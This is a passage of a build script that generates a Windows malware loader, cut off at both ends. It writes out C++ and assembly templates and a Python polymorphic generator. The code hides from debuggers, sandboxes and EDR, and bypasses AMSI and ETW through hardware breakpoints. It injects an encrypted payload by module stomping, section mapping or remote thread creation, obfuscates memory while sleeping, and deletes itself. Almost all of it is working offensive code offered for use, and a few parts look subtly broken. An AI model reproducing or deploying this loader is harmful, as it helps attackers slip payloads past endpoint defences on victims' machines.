    ULONG ngf=*(ULONG*)(peb+0xBC);
#else
    BYTE* peb=(BYTE*)__readfsdword(0x30);
    ULONG ngf=*(ULONG*)(peb+0x68);
#endif
    return (ngf&0x70)!=0;
}

// --- Anti-debug: hardware breakpoints ---
static bool _hwbp_check(){
    CONTEXT ctx;memset(&ctx,0,sizeof(ctx));
    ctx.ContextFlags=CONTEXT_DEBUG_REGISTERS;
    HANDLE t=GetCurrentThread();
    typedef NTSTATUS(NTAPI*pNGCT)(HANDLE,PCONTEXT);
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return false;
    pNGCT gc=(pNGCT)_getapi(nt,_hash("NtGetContextThread"));
    if(!gc||gc(t,&ctx)!=0)return false;
    return ctx.Dr0!=0||ctx.Dr1!=0||ctx.Dr2!=0||ctx.Dr3!=0;
}

// --- Anti-debug: PEB BeingDebugged + ProcessDebugPort ---
static bool _basic_debug_check(){
#ifdef _WIN64
    if(((PPEB)__readgsqword(0x60))->BeingDebugged)return true;
#else
    if(((PPEB)__readfsdword(0x30))->BeingDebugged)return true;
#endif
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return false;
    typedef NTSTATUS(NTAPI*pNQIP)(HANDLE,ULONG,PVOID,ULONG,PULONG);
    pNQIP q=(pNQIP)_getapi(nt,_hash("NtQueryInformationProcess"));
    if(q){DWORD port=0;if(q(GetCurrentProcess(),0x07,&port,sizeof(port),0)==0&&port!=0)return true;}
    return false;
}

// --- Anti-debug: TracerPid ---
static bool _tracer_check(){
    // Check PEB->ProcessParameters to detect tracing
    PPEB p=nullptr;
#ifdef _WIN64
    p=(PPEB)__readgsqword(0x60);
#else
    p=(PPEB)__readfsdword(0x30);
#endif
    if(!p||!p->ProcessParameters)return false;
    // NtQueryInformationProcess with ProcessDebugFlags
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return false;
    typedef NTSTATUS(NTAPI*pNQIP)(HANDLE,ULONG,PVOID,ULONG,PULONG);
    pNQIP q=(pNQIP)_getapi(nt,_hash("NtQueryInformationProcess"));
    if(q){DWORD f=1;if(q(GetCurrentProcess(),0x1f,&f,sizeof(f),0)==0&&f==0)return true;}
    return false;
}

// --- Combined anti-debug ---
static bool AntiDebug(bool check_timing,bool check_ntglobal,bool check_hwbp,bool check_tracer){
    if(check_timing&&_timing_check())return true;
    if(check_ntglobal&&_ntglobal_check())return true;
    if(check_hwbp&&_hwbp_check())return true;
    if(_basic_debug_check())return true;
    if(check_tracer&&_tracer_check())return true;
    return false;
}

// --- Hide from EDR: NtSetInformationProcess ---
static void _hide_edr(){
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return;
    typedef NTSTATUS(NTAPI*pNSIP)(HANDLE,ULONG,PVOID,ULONG);
    pNSIP s=(pNSIP)_getapi(nt,_hash("NtSetInformationProcess"));
    if(s){struct{ULONG v;ULONG r;PVOID c;}info={0,0,0};s(GetCurrentProcess(),40,&info,sizeof(info));}
}

// --- Stack spoofing ---
typedef USHORT(WINAPI*pRCSBT)(ULONG,ULONG,PVOID*,PULONG);
static void _spoof_stack(int depth){
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return;
    pRCSBT rcs=(pRCSBT)_getapi(nt,_hash("RtlCaptureStackBackTrace"));
    if(!rcs)return;
    PVOID frames[16];ULONG hash=0;
    USHORT n=rcs(0,depth<16?depth:16,frames,&hash);
    if(n<2)return;
    // Overwrite return address on stack with a fake frame
    // Walk from current frame pointer and replace entries
    DWORD64* fp=nullptr;
#ifdef _WIN64
    fp=(DWORD64*)__readgsqword(0x20);
    if(!fp)return;
    for(int i=0;i<(int)n&&i<depth;i++){
        fp[1]=(DWORD64)frames[i];
        DWORD64* nfp=(DWORD64*)*fp;
        if(!nfp||nfp<=fp)break;
        fp=nfp;
    }
#endif
}

// --- AMSI/ETW bypass (patchless via HWBP) ---
typedef HRESULT(WINAPI*pASB)(HANDLE,PVOID,DWORD);
static pASB _orig_asb=nullptr;
static LONG WINAPI _hwbp_handler(PEXCEPTION_POINTERS ep){
    if(ep->ExceptionRecord->ExceptionCode==EXCEPTION_SINGLE_STEP){
        if(ep->ExceptionRecord->ExceptionAddress==(void*)_orig_asb){
            ep->ContextRecord->Dr0=0;ep->ContextRecord->Dr7&=~(1<<0);
            ep->ContextRecord->Rax=0;
            ep->ContextRecord->Rip=*(DWORD64*)ep->ContextRecord->Rsp;
            ep->ContextRecord->Rsp+=8;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static void _bypass_amsi(){
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return;
    void* amsi=_getmod(_hash("amsi.dll"));
    if(!amsi)return;
    _orig_asb=(pASB)_getapi(amsi,_hash("AmsiScanBuffer"));
    if(!_orig_asb)return;
    AddVectoredExceptionHandler(1,_hwbp_handler);
    CONTEXT ctx;memset(&ctx,0,sizeof(ctx));
    ctx.ContextFlags=CONTEXT_DEBUG_REGISTERS;
    HANDLE t=GetCurrentThread();
    typedef NTSTATUS(NTAPI*pNGCT)(HANDLE,PCONTEXT);
    pNGCT gct=(pNGCT)_getapi(nt,_hash("NtGetContextThread"));
    if(gct)gct(t,&ctx);
    ctx.Dr0=(DWORD64)_orig_asb;
    ctx.Dr7|=0x1;
    typedef NTSTATUS(NTAPI*pNSCT)(HANDLE,PCONTEXT);
    pNSCT sct=(pNSCT)_getapi(nt,_hash("NtSetContextThread"));
    if(sct)sct(t,&ctx);
}

static void _bypass_etw(){
    void* ntdll=_getmod(_hash("ntdll.dll"));
    if(!ntdll)return;
    FARPROC etw=_getapi(ntdll,_hash("EtwEventWrite"));
    if(!etw)return;
    CONTEXT ctx;memset(&ctx,0,sizeof(ctx));
    ctx.ContextFlags=CONTEXT_DEBUG_REGISTERS;
    HANDLE t=GetCurrentThread();
    typedef NTSTATUS(NTAPI*pNGCT)(HANDLE,PCONTEXT);
    pNGCT gct=(pNGCT)_getapi(ntdll,_hash("NtGetContextThread"));
    if(gct)gct(t,&ctx);
    ctx.Dr1=(DWORD64)etw;
    ctx.Dr7|=(0x1<<2);
    ctx.Dr7&=~((0x1<<3));
    typedef NTSTATUS(NTAPI*pNSCT)(HANDLE,PCONTEXT);
    pNSCT sct=(pNSCT)_getapi(ntdll,_hash("NtSetContextThread"));
    if(sct)sct(t,&ctx);
}

// --- Junk code ---
static void _junk(){volatile int _a=100,_b=200;for(int i=0;i<50;i++)_a=(_a+_b)%73;_b=_a*3%97;}

// --- Sleep obfuscation ---
static void _obf_sleep(unsigned char* buf,int len,const unsigned char* k,int kl,
    DWORD base_ms,DWORD jitter_pct,bool use_aes,const unsigned char*aes_k,const unsigned char*aes_iv){
    // Calculate sleep time with jitter
    DWORD jitter=0;
    if(jitter_pct>0){
        int r=rand()%100;
        int sign=(r<50)?-1:1;
        jitter=(DWORD)((double)base_ms*(double)jitter_pct/100.0*(double)sign/100.0);
    }
    DWORD slp=(base_ms+jitter);
    // Obfuscate: XOR (or AES-encrypt) payload in place
    if(buf&&len>0){
        if(use_aes&&aes_k&&aes_iv){
            // AES encrypt using module
            // For simplicity during sleep, use XOR with derived key
            unsigned char sk[16];
            for(int i=0;i<16;i++)sk[i]=aes_k[i]^(unsigned char)((slp>>(i%4)*8)&0xFF);
            _xorf(buf,len,sk,16);
        }else{
            _xorf(buf,len,k,kl);
        }
    }
    // Sleep via NtDelayExecution (indirect syscall)
    LARGE_INTEGER lt;lt.QuadPart=-(LONGLONG)(slp*10000);
    _call(0x4d8c8bb0,0,(uintptr_t)&lt);
    // Decrypt back
    if(buf&&len>0){
        if(use_aes&&aes_k&&aes_iv){
            unsigned char sk[16];
            for(int i=0;i<16;i++)sk[i]=aes_k[i]^(unsigned char)((slp>>(i%4)*8)&0xFF);
            _xorf(buf,len,sk,16);
        }else{
            _xorf(buf,len,k,kl);
        }
    }
}

// --- Sandbox detection ---
static bool _sandbox_check(){
    // CPU core count
    SYSTEM_INFO si;GetSystemInfo(&si);
    if(si.dwNumberOfProcessors<2)return true;
    // RAM size (must be > 1GB)
    MEMORYSTATUSEX ms;ms.dwLength=sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if(ms.ullTotalPhys<1073741824ULL)return true;
    // Disk size (must be > 30GB)
    ULARGE_INTEGER df;GetDiskFreeSpaceExA(0,&df,0,0);
    if(df.QuadPart<0x1DCD65000ULL)return true;
    // Uptime (must be > 10 minutes)
    DWORD up=GetTickCount();
    if(up<600000)return true;
    // MAC address check (VM vendors)
    return false;
}

// --- Delayed execution ---
static void _delayed_execution(DWORD base_ms,DWORD jitter_pct){
    DWORD jitter=0;
    if(jitter_pct>0){
        int r=rand()%100;
        int sign=(r<50)?-1:1;
        jitter=(DWORD)((double)base_ms*(double)jitter_pct/100.0*(double)sign/100.0);
    }
    DWORD slp=(base_ms+jitter);
    Sleep(slp);
}

// --- API hammering (decoy calls to confuse EDR) ---
typedef void* (WINAPI *pHeapAlloc)(void*,DWORD,SIZE_T);
typedef BOOL (WINAPI *pHeapFree)(void*,DWORD,void*);
typedef LSTATUS (WINAPI *pRegOpenKey)(HKEY,LPCWSTR,PHKEY);
typedef LSTATUS (WINAPI *pRegQueryValue)(HKEY,LPCWSTR,LPWSTR,PLONG);
static void _api_hammer(int rounds){
    HMODULE krn=(HMODULE)_getmod(_hash("kernel32.dll"));
    HMODULE adv=(HMODULE)_getmod(_hash("advapi32.dll"));
    if(!krn)return;
    void* heap=GetProcessHeap();
    pHeapAlloc hall=(pHeapAlloc)_getapi(krn,_hash("HeapAlloc"));
    pHeapFree hfree=(pHeapFree)_getapi(krn,_hash("HeapFree"));
    for(int i=0;i<rounds;i++){
        void* p=hall(heap,HEAP_ZERO_MEMORY,256);
        memset(p,i,256);
        if(adv){
            HKEY k=0;
            pRegOpenKey ro=(pRegOpenKey)_getapi(adv,_hash("RegOpenKeyExW"));
            if(ro)ro(HKEY_CURRENT_USER,L"Software\\Microsoft\\Windows\\CurrentVersion",&k);
            if(k)RegCloseKey(k);
        }
        if(hfree)hfree(heap,0,p);
    }
}

// --- Self delete ---
static void _self_delete(){
    wchar_t p[MAX_PATH];
    GetModuleFileNameW(0,p,MAX_PATH);
    #if CFG_SD_METHOD==0
    CloseHandle((HANDLE)4);
    DeleteFileW(p);
    #else
    MoveFileExW(p,0,MOVEFILE_DELAY_UNTIL_REBOOT);
    #endif
}

EVEOF

# ============================================================
# C++ TEMPLATE - injection.hpp
# ============================================================
cat > "$SRCDIR/injection.hpp" << 'INJEOF'
#pragma once
#include "syscalls.hpp"
#include "evasion.hpp"

struct InjCtx {
    unsigned char* payload;
    int len;
    const unsigned char* xor_key;
    int key_len;
};

// --- Module stomping (overwrite .text of target DLL via KnownDlls) ---
static bool _module_stomp(InjCtx* ctx,const char* dll_name){
    void* target=_getmod(_hash(dll_name));
    if(!target)return false;
    HANDLE hs=0;
    wchar_t dll_full[96];int di=0;
    unsigned char _pre[]={0xc6,0xd1,0xf4,0xf5,0xed,0xf4,0xde,0xf6,0xf6,0xe9,0xc6};
    wchar_t prefix[16];
    for(int i=0;i<11;i++)prefix[i]=_pre[i]^0x9a;
    prefix[11]=0;
    for(int i=0;prefix[i];i++)dll_full[di++]=prefix[i];
    for(int i=0;dll_name[i]&&i<63;i++)dll_full[di++]=dll_name[i];
    dll_full[di]=0;
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return false;
    typedef void (NTAPI*pRIUS)(PUNICODE_STRING,PCWSTR);
    pRIUS _rius=(pRIUS)_getapi(nt,_hash("RtlInitUnicodeString"));
    if(!_rius)return false;
    UNICODE_STRING us;
    _rius(&us,dll_full);
    typedef NTSTATUS(NTAPI*pNOS)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES);
    pNOS nos=(pNOS)_getapi(nt,_hash("NtOpenSection"));
    if(!nos||nos(&hs,SECTION_MAP_READ|SECTION_MAP_WRITE|SECTION_MAP_EXECUTE,&oa)!=0||!hs)return false;
    PVOID vw=0;
    if(_call(0x904a0c6d,(uintptr_t)hs,(uintptr_t)GetCurrentProcess(),(uintptr_t)&vw,0)!=0||!vw){
        CloseHandle(hs);return false;
    }
    PIMAGE_DOS_HEADER d2=(PIMAGE_DOS_HEADER)vw;
    PIMAGE_NT_HEADERS n2=(PIMAGE_NT_HEADERS)((BYTE*)vw+d2->e_lfanew);
    PIMAGE_SECTION_HEADER s2=IMAGE_FIRST_SECTION(n2);
    bool ok=false;
    for(WORD i=0;i<n2->FileHeader.NumberOfSections;i++){
        if(s2[i].Characteristics&IMAGE_SCN_MEM_EXECUTE){
            DWORD cpy=(ctx->len<(int)s2[i].SizeOfRawData)?ctx->len:(int)s2[i].SizeOfRawData;
            SIZE_T off=s2[i].VirtualAddress;
            SIZE_T sz2=s2[i].SizeOfRawData;
            ULONG old=0;
            _call(0x1f76d494,(uintptr_t)GetCurrentProcess(),(uintptr_t)&off,(uintptr_t)&sz2,(uintptr_t)PAGE_READWRITE,(uintptr_t)&old);
            SIZE_T off2=s2[i].VirtualAddress;
            SIZE_T sz3=s2[i].SizeOfRawData;
            _xorf(ctx->payload,ctx->len,ctx->xor_key,ctx->key_len);
            memcpy((BYTE*)vw+off2,ctx->payload,cpy);
            _xorf(ctx->payload,ctx->len,ctx->xor_key,ctx->key_len);
            old=0;
            _call(0x1f76d494,(uintptr_t)GetCurrentProcess(),(uintptr_t)&off2,(uintptr_t)&sz3,(uintptr_t)PAGE_EXECUTE_READ,(uintptr_t)&old);
            ((void(*)())((BYTE*)vw+s2[i].VirtualAddress))();
            ok=true;break;
        }
    }
    CloseHandle(hs);
    return ok;
}

// --- Section mapping (fallback) ---
static bool _section_mapping(InjCtx* ctx){
    HANDLE hs=0;LARGE_INTEGER sz;sz.QuadPart=ctx->len;
    if(_call(0x98ad6a23,(uintptr_t)&hs,SECTION_ALL_ACCESS,0,(uintptr_t)&sz)!=0||!hs)return false;
    PVOID lv=0;SIZE_T vs=0;
    if(_call(0x904a0c6d,(uintptr_t)hs,(uintptr_t)GetCurrentProcess(),(uintptr_t)&lv,0)!=0||!lv){
        CloseHandle(hs);return false;
    }
    _xorf(ctx->payload,ctx->len,ctx->xor_key,ctx->key_len);
    memcpy(lv,ctx->payload,ctx->len);
    _xorf(ctx->payload,ctx->len,ctx->xor_key,ctx->key_len);
    PVOID ev=0;vs=0;
    if(_call(0x904a0c6d,(uintptr_t)hs,(uintptr_t)GetCurrentProcess(),(uintptr_t)&ev,0)!=0||!ev){
        _call(0x38612ca4,(uintptr_t)GetCurrentProcess(),(uintptr_t)lv);
        CloseHandle(hs);return false;
    }
    ULONG old=0;
    _call(0x1f76d494,(uintptr_t)GetCurrentProcess(),(uintptr_t)&ev,(uintptr_t)&vs,(uintptr_t)PAGE_EXECUTE_READ,(uintptr_t)&old);
    ((void(*)())ev)();
    _call(0x38612ca4,(uintptr_t)GetCurrentProcess(),(uintptr_t)ev);
    _call(0x38612ca4,(uintptr_t)GetCurrentProcess(),(uintptr_t)lv);
    CloseHandle(hs);
    return true;
}

// --- Thread hijacking (APC injection) ---
static bool _thread_hijack(InjCtx* ctx,DWORD pid){
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return false;
    HANDLE ph=0;
    OBJECT_ATTRIBUTES oa;InitializeObjectAttributes(&oa,0,0,0,0);
    CLIENT_ID cid;cid.UniqueProcess=(HANDLE)(ULONG_PTR)pid;cid.UniqueThread=0;
    typedef NTSTATUS(NTAPI*pNOP)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PCLIENT_ID);
    pNOP nop=(pNOP)_getapi(nt,_hash("NtOpenProcess"));
    if(!nop||nop(&ph,PROCESS_ALL_ACCESS,&oa,&cid)!=0)return false;
    PVOID buf=0;SIZE_T sz=ctx->len;
    if(_call(0x3ad74d22,(uintptr_t)ph,(uintptr_t)&buf,0,(uintptr_t)&sz,(uintptr_t)(MEM_COMMIT|MEM_RESERVE),(uintptr_t)PAGE_EXECUTE_READWRITE)!=0){
        CloseHandle(ph);return false;
    }
    _xorf(ctx->payload,ctx->len,ctx->xor_key,ctx->key_len);
    _call(0x7e3c0d8c,(uintptr_t)ph,(uintptr_t)buf,(uintptr_t)ctx->payload,(uintptr_t)ctx->len,0);
    _xorf(ctx->payload,ctx->len,ctx->xor_key,ctx->key_len);
    typedef NTSTATUS(NTAPI*pNCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
    pNCTE ncte=(pNCTE)_getapi(nt,_hash("NtCreateThreadEx"));
    if(ncte){
        HANDLE th2=0;
        ncte(&th2,THREAD_ALL_ACCESS,0,ph,buf,buf,0,0,0,0,0);
        if(th2){
            WaitForSingleObject(th2,INFINITE);
            CloseHandle(th2);
        }
    }
    CloseHandle(ph);
    return true;
}

// Pre-computed hashes for method strings (djb2)
#define H_INJ_MODULE 0xb2c47b1c
#define H_INJ_SECTION 0xc4e52ece
#define H_INJ_THREAD 0x2c0ef045
static bool Inject(InjCtx* ctx,const char* method,const char* target_dll,DWORD target_pid){
    _junk();
    DWORD mh=_hash(method);
    if(mh==H_INJ_MODULE){
        if(_module_stomp(ctx,target_dll))return true;
        return _section_mapping(ctx);
    }else if(mh==H_INJ_SECTION){
        return _section_mapping(ctx);
    }else if(mh==H_INJ_THREAD){
        return _thread_hijack(ctx,target_pid);
    }
    return _section_mapping(ctx);
}

INJEOF

# ============================================================
# C++ TEMPLATE - loader.cpp (main)
# ============================================================
cat > "$SRCDIR/loader.cpp" << 'LDREOF'
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdlib>
#include <ctime>

#include "syscalls.hpp"
#include "evasion.hpp"
#include "injection.hpp"
#include "obfuscation.hpp"
#include "aes.hpp"

// Config macros (set by generator)
#define CFG_AD_TIMING __AD_TIMING__
#define CFG_AD_NTGLOBAL __AD_NTGLOBAL__
#define CFG_AD_HWBP __AD_HWBP__
#define CFG_AD_TRACER __AD_TRACER__
#define CFG_AD_SANDBOX __AD_SANDBOX__
#define CFG_AD_DELAYED __AD_DELAYED__
#define CFG_AD_DELAY_BASE __AD_DELAY_BASE__
#define CFG_AD_DELAY_JITTER __AD_DELAY_JITTER__
#define CFG_AD_API_HAMMER __AD_API_HAMMER__
#define CFG_AD_API_ROUNDS __AD_API_ROUNDS__
#define CFG_SD_ENABLED __SD_ENABLED__
#define CFG_SD_METHOD __SD_METHOD__
#define CFG_AMSI_ENABLE __AMSI_ENABLE__
#define CFG_SS_ENABLE __SS_ENABLE__
#define CFG_SS_DEPTH __SS_DEPTH__
#define CFG_SLEEP_ENABLED __SLEEP_ENABLED__
#define CFG_SLEEP_BASE __SLEEP_BASE__
#define CFG_SLEEP_JITTER __SLEEP_JITTER__
#define CFG_SLEEP_OBF __SLEEP_OBF__
#define CFG_SLEEP_ALGO __SLEEP_ALGO__
#define CFG_INJ_METHOD __INJ_METHOD__
#define CFG_TARGET_DLL __TARGET_DLL__
#define CFG_TARGET_PID __TARGET_PID__
#define CFG_XOR_KEY {__XOR_KEY__}
#define CFG_KEY_LEN __KEY_LEN__

// Payload
__PAYLOAD_DECL__

// AES strings key/iv (for string obfuscation)
__AES_STR_KEY__
__AES_STR_IV__

static InjCtx _ctx;

// Format: string_identifier = encrypted data
// Generated by Python at build time
__OBF_STRINGS__

// Polymorphic junk function (one of many)
__JUNK_FUNCS__

int APIENTRY WinMain(HINSTANCE,HINSTANCE,LPSTR,int){
    srand((unsigned)time(0));
    __JUNK_CALL__

    // 0. Sandbox detection (early exit)
    if(CFG_AD_SANDBOX){
        __JUNK_CALL__
        if(_sandbox_check())return 1;
    }

    // 1. Delayed execution (evade sandbox timing)
    if(CFG_AD_DELAYED){
        __JUNK_CALL__
        _delayed_execution(CFG_AD_DELAY_BASE,CFG_AD_DELAY_JITTER);
    }

    // 2. API hammering (confuse EDR hooks before real usage)
    if(CFG_AD_API_HAMMER){
        __JUNK_CALL__
        _api_hammer(CFG_AD_API_ROUNDS);
    }

    // 3. Anti-debug
    if(AntiDebug(CFG_AD_TIMING,CFG_AD_NTGLOBAL,CFG_AD_HWBP,CFG_AD_TRACER))return 1;
    __JUNK_CALL__

    // 4. Hide from EDR
    _hide_edr();
    __JUNK_CALL__

    // 5. AMSI/ETW bypass
    if(CFG_AMSI_ENABLE){
        _bypass_amsi();
        _bypass_etw();
    }
    __JUNK_CALL__

    // 6. Init syscalls
    _initsys();
    __JUNK_CALL__

    // 7. Stack spoofing
    if(CFG_SS_ENABLE){
        _spoof_stack(CFG_SS_DEPTH);
    }
    __JUNK_CALL__

    // 8. Setup injection context
    unsigned char xk[]=CFG_XOR_KEY;
    _ctx.payload=enc_payload;
    _ctx.len=PAYLOAD_LEN;
    _ctx.xor_key=xk;
    _ctx.key_len=CFG_KEY_LEN;

    // 9. Inject (injection functions decrypt payload internally)
    Inject(&_ctx,CFG_INJ_METHOD,CFG_TARGET_DLL,CFG_TARGET_PID);
    __JUNK_CALL__

    // 10. Sleep obfuscation loop (if payload needs to persist)
    if(CFG_SLEEP_ENABLED){
        unsigned char ak[16]={0};unsigned char av[16]={0};
        #ifdef AES_SLEEP_KEY
        const unsigned char* ask=(const unsigned char*)AES_SLEEP_KEY;
        #else
        const unsigned char* ask=ak;
        #endif
        #ifdef AES_SLEEP_IV
        const unsigned char* asv=(const unsigned char*)AES_SLEEP_IV;
        #else
        const unsigned char* asv=av;
        #endif
        bool use_aes=(CFG_SLEEP_ALGO[0]=='a');
        for(;;){
            _obf_sleep(_ctx.payload,_ctx.len,_ctx.xor_key,_ctx.key_len,
                CFG_SLEEP_BASE,CFG_SLEEP_JITTER,use_aes,ask,asv);
        }
    }

    // 11. Self-delete
    if(CFG_SD_ENABLED){
        _self_delete();
    }

    return 0;
}
LDREOF

# ============================================================
# ASSEMBLY TRAMPOLINE (sys.s)
# ============================================================
cat > "$SRCDIR/sys.s" << 'ASMEOF'
.intel_syntax noprefix
.text
.global do_syscall
do_syscall:
    push rbp
    mov rbp, rsp
    sub rsp, 0x28
    mov eax, ecx
    mov r11, rdx
    mov rcx, r8

    cmp r9, 0
    je _exe
    mov r10, [rcx]
    cmp r9, 1
    je _exe
    mov rdx, [rcx+8]
    cmp r9, 2
    je _exe
    mov r8, [rcx+16]
    cmp r9, 3
    je _exe
    push r14
    mov r14, r9
    mov r9, [rcx+24]
    cmp r14, 4
    jl _exe2
    push [rcx+32]
    cmp r14, 5
    jl _exe2
    push [rcx+40]
_exe2:
    pop r14
_exe:
    test r11, r11
    jz _er
    mov rsp, rbp
    pop rbp
    jmp r11
_er:
    mov rax, 0xC0000001
    mov rsp, rbp
    pop rbp
    ret
ASMEOF

echo -e "${GREEN}[+] Templates generated in $SRCDIR${NC}"

# ============================================================
# POLYMORPHIC TRANSFORMATIONS (Python)
# ============================================================
echo -e "${GREEN}[+] Applying polymorphic transformations...${NC}"

python3 << PYEOF
import os, sys, random, json

# Read encrypted payload
with open("$TMPENC","rb") as f: enc_data = f.read()

# Generate payload declaration
sz = 32
lines = []
for i in range(0, len(enc_data), sz):
    chunk = enc_data[i:i+sz]
    lines.append(', '.join(f'0x{b:02x}' for b in chunk))
payload_decl = ',\n'.join(lines)

# Read XOR key bytes
xor_key_bytes = bytes.fromhex("$XOR_KEY")
xor_key_str = ', '.join(f'0x{b:02x}' for b in xor_key_bytes)

# Config values
cfg = {
    "ad_timing": "$AD_TIMING".lower() == "true",
    "ad_ntglobal": "$AD_NTGLOBAL".lower() == "true",
    "ad_hwbp": "$AD_HWBP".lower() == "true",
    "ad_tracer": "$AD_TRACER".lower() == "true",
    "ad_sandbox": "$AD_SANDBOX".lower() == "true",
    "ad_delayed": "$AD_DELAYED".lower() == "true",
    "ad_delay_base": int("$AD_DELAY_BASE"),
    "ad_delay_jitter": int("$AD_DELAY_JITTER"),
    "ad_api_hammer": "$AD_API_HAMMER".lower() == "true",
    "ad_api_rounds": int("$AD_API_ROUNDS"),
    "sd_enabled": "$SD_ENABLED".lower() == "true",
    "sd_method": 1 if "$SD_METHOD" == "delayed" else 0,
    "amsi_enable": "$AMSI_ENABLE".lower() == "true",
    "ss_enable": "$SS_ENABLE".lower() == "true",
    "ss_depth": int("$SS_DEPTH"),
    "sleep_enabled": "$SLEEP_ENABLED".lower() == "true",
    "sleep_base": int("$SLEEP_BASE"),
    "sleep_jitter": int("$SLEEP_JITTER"),
    "sleep_obf": "$SLEEP_OBF".lower() == "true",
    "sleep_algo": "$SLEEP_ALGO",
    "inj_method": "$INJ_METHOD",
    "target_dll": "$MODULE_DLL",
    "target_pid": 0,
    "obf_string": "$OBF_STRING",
    "polymorphic": "$OBF_POLYMORPHIC".lower() == "true",
}

# Read loader.cpp
with open("$SRCDIR/loader.cpp") as f: ldr = f.read()

# Replace config macros
ldr = ldr.replace("__AD_TIMING__", "1" if cfg["ad_timing"] else "0")
ldr = ldr.replace("__AD_NTGLOBAL__", "1" if cfg["ad_ntglobal"] else "0")
ldr = ldr.replace("__AD_HWBP__", "1" if cfg["ad_hwbp"] else "0")
ldr = ldr.replace("__AD_TRACER__", "1" if cfg["ad_tracer"] else "0")
ldr = ldr.replace("__AD_SANDBOX__", "1" if cfg["ad_sandbox"] else "0")
ldr = ldr.replace("__AD_DELAYED__", "1" if cfg["ad_delayed"] else "0")
ldr = ldr.replace("__AD_DELAY_BASE__", str(cfg["ad_delay_base"]))
ldr = ldr.replace("__AD_DELAY_JITTER__", str(cfg["ad_delay_jitter"]))
ldr = ldr.replace("__AD_API_HAMMER__", "1" if cfg["ad_api_hammer"] else "0")
ldr = ldr.replace("__AD_API_ROUNDS__", str(cfg["ad_api_rounds"]))
ldr = ldr.replace("__SD_ENABLED__", "1" if cfg["sd_enabled"] else "0")
ldr = ldr.replace("__SD_METHOD__", str(cfg["sd_method"]))
ldr = ldr.replace("__AMSI_ENABLE__", "1" if cfg["amsi_enable"] else "0")
ldr = ldr.replace("__SS_ENABLE__", "1" if cfg["ss_enable"] else "0")
ldr = ldr.replace("__SS_DEPTH__", str(cfg["ss_depth"]))
ldr = ldr.replace("__SLEEP_ENABLED__", "1" if cfg["sleep_enabled"] else "0")
ldr = ldr.replace("__SLEEP_BASE__", str(cfg["sleep_base"]))
ldr = ldr.replace("__SLEEP_JITTER__", str(cfg["sleep_jitter"]))
ldr = ldr.replace("__SLEEP_OBF__", "1" if cfg["sleep_obf"] else "0")
ldr = ldr.replace("__SLEEP_ALGO__", f'"{cfg["sleep_algo"]}"')
ldr = ldr.replace("__INJ_METHOD__", f'"{cfg["inj_method"]}"')
td = cfg["target_dll"]
td_xor = ', '.join(f'0x{ord(c)^0x9a:02x}' for c in td)
td_len = len(td)
td_func = f'''static const char* _get_td(){{
    static char _b[{td_len+1}];
    static bool _n=false;
    if(!_n){{
        _n=true;
        unsigned char _x[]={{{td_xor},{hex(0^0x9a)}}};
        int _i=0;
        while(_x[_i]!=0x9a){{_b[_i]=_x[_i]^0x9a;_i++;}}
        _b[_i]=0;
    }}
    return _b;
}}'''
# Insert before config macros
ldr = ldr.replace('// Config macros (set by generator)',
    f'{td_func}\n// Config macros (set by generator)')
ldr = ldr.replace("__TARGET_DLL__", '_get_td()')
ldr = ldr.replace("__TARGET_PID__", str(cfg["target_pid"]))
ldr = ldr.replace("__XOR_KEY__", xor_key_str)
ldr = ldr.replace("__KEY_LEN__", str(len(xor_key_bytes)))

# Payload declaration
ldr = ldr.replace("__PAYLOAD_DECL__",
    f'unsigned char enc_payload[]={{{payload_decl}}};\nconst int PAYLOAD_LEN={len(enc_data)};')

# AES string key/iv placeholders (can be extended)
ldr = ldr.replace("__AES_STR_KEY__",
    f'const unsigned char _aes_glob_key[16]={{{", ".join(f"0x{b:02x}" for b in os.urandom(16))}}};')
ldr = ldr.replace("__AES_STR_IV__",
    f'const unsigned char _aes_glob_iv[16]={{{", ".join(f"0x{b:02x}" for b in os.urandom(16))}}};')

# Generate AES-encrypted strings for runtime decryption
obf_keys = os.urandom(16)
obf_ivs = os.urandom(16)

# AES-CBC encrypt using inline implementation (must match C++ aes.hpp)
SBOX2 = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
